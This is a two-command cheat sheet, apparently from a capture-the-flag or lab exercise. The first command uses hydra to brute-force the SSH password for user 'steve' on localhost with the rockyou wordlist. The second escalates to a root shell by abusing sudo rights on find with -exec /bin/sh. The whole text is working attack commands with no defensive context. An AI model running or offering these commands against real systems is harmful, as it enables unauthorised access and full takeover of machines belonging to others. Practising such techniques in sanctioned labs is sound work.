Crack password:
```sh
hydra -l steve -P /usr/share/wordlists/rockyou.txt 127.0.0.1 ssh
```

Privileges escalation:
```Sh
sudo find . -exec /bin/sh \; -quit
```
